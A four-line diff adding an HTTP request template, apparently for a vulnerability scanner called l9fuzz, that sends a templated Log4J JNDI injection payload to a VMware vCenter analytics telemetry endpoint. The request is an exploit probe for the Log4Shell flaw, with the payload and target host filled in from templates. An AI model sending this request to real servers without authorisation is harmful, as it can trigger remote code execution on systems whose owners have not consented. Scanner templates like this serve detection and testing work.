@@ -1,0 +1,4 @@
+POST /analytics/telemetry/ph/api/hyper/send?i=l9fuzz&_c={{ .Fuzzer.PayloadJNDILog4J .Url.String "vcenter-analytics" }} HTTP/1.1
+Host: {{ .Url.Hostname }}:{{ .Url.Port }}
+User-Agent: l9fuzz
+
